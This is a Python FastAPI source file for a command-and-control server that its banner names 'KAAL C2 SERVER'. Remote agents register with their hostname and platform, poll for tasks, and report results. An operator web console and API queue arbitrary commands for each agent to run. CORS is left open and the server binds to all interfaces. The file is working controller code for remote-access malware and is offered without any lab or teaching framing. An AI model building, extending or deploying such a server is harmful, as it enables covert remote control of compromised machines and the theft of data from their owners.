from fastapi import FastAPI, WebSocket, Request, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Dict, Any, Optional, List
import json
import logging
from datetime import datetime

# Imoprt Core Modules
# Note: Ensure the root directory is in PYTHONPATH or install as package
import sys
import os
from pathlib import Path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.logger import setup_logger
from core.state_manager import terminal_state
from core.config import Config

# Setup
log = setup_logger("web_server")
config = Config()
app = FastAPI(title="Kaal Framework API", version="4.0.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-memory storage for agents (simplified for test)
# Key: agent_id, Value: Agent Data
agents: Dict[str, Dict[str, Any]] = {}

class CommandRequest(BaseModel):
    agent_id: str
    command: str
    parameters: Optional[Dict[str, Any]] = None

@app.get("/api/health")
async def health_check():
    return {"status": "ok", "version": "4.0.0"}

# --- Agent Interaction Endpoints (for Agents) ---

@app.post("/api/v1/register")
async def register_agent(request: Request):
    """
    Endpoint for agents to register themselves.
    Expected JSON: {"agent_id": "...", "platform": "...", "hostname": "...", ...}
    """
    try:
        data = await request.json()
        agent_id = data.get("agent_id")
        if not agent_id:
            raise HTTPException(status_code=400, detail="Missing agent_id")
        
        agents[agent_id] = {
            "id": agent_id,
            "platform": data.get("platform", "unknown"),
            "hostname": data.get("hostname", "unknown"),
            "internal_ip": request.client.host,
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "status": "active",
            "tasks": []
        }
        log.info(f"Agent registered: {agent_id} ({data.get('hostname')})")
        
        # Broadcast to UI
        await terminal_state.broadcast("agent_registered", agents[agent_id])
        
        return {"status": "registered"}
    except Exception as e:
        log.error(f"Registration error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/task/{agent_id}")
async def get_task(agent_id: str):
    """
    Endpoint for agents to poll for tasks.
    Returns the next pending task or empty string.
    """
    if agent_id not in agents:
        return "" # Or register?
    
    agent = agents[agent_id]
    agent["last_seen"] = datetime.now().isoformat()
    agent["status"] = "active"
    
    # Check for pending tasks
    if agent["tasks"]:
        return agent["tasks"].pop(0) # FIFO
    
    return ""

@app.post("/api/v1/result")
async def report_result(request: Request):
    """
    Endpoint for agents to report task results.
    Expected JSON: {"agent_id": "...", "task_id": "...", "result": "..."}
    """
    try:
        data = await request.json()
        agent_id = data.get("agent_id")
        result = data.get("result")
        
        if agent_id in agents:
            agents[agent_id]["last_seen"] = datetime.now().isoformat()
            log.info(f"Result from {agent_id}: {result[:50]}...")
            
            # Broadcast to UI
            await terminal_state.broadcast("task_result", {
                "agent_id": agent_id,
                "result": result
            })
            
        return {"status": "received"}
    except Exception as e:
        log.error(f"Result error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

# --- UI Endpoints (for Frontend) ---

@app.get("/api/agents")
async def list_agents():
    return list(agents.values())

@app.post("/api/command")
async def queue_command(cmd: CommandRequest):
    """
    Queue a command for an agent.
    """
    if cmd.agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    # Add to agent's task queue
    # Format: "exec command" or just "command"
    task = cmd.command
    if cmd.parameters:
        # Append parameters if needed (simplified)
        pass
        
    agents[cmd.agent_id]["tasks"].append(task)
    log.info(f"Queued task for {cmd.agent_id}: {task}")
    
    return {"status": "queued", "task": task}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await terminal_state.register_client(websocket)
    # Send initial state
    await websocket.send_json({
        "type": "agent_list",
        "data": list(agents.values())
    })
    try:
        while True:
            data = await websocket.receive_text()
            # Handle incoming WebSocket messages if needed
    except Exception:
        terminal_state.remove_client(websocket)

# Serve Frontend
static_dir = Path(__file__).parent / "static"
if static_dir.exists():
    app.mount("/assets", StaticFiles(directory=static_dir), name="assets")

from fastapi.responses import FileResponse, HTMLResponse

@app.get("/{full_path:path}")
async def serve_static_app(full_path: str):
    # API requests are already handled by specific routes above due to order
    if full_path.startswith("api"):
        raise HTTPException(status_code=404, detail="API endpoint not found")
        
    index = static_dir / "index.html"
    if index.exists():
        return FileResponse(index)
    return HTMLResponse("<h1>KAAL Web Console</h1><p>NEBULA Console not found in web/static/index.html.</p>")

if __name__ == "__main__":
    import uvicorn
    print("\n" + "="*50)
    print(" KAAL C2 SERVER STARTING...")
    print("="*50)
    print(f" [+] Web Interface: http://localhost:5000")
    print(f" [+] API Endpoint:  http://localhost:5000/api")
    print("="*50 + "\n")
    uvicorn.run("web.server:app", host="0.0.0.0", port=5000, reload=True)

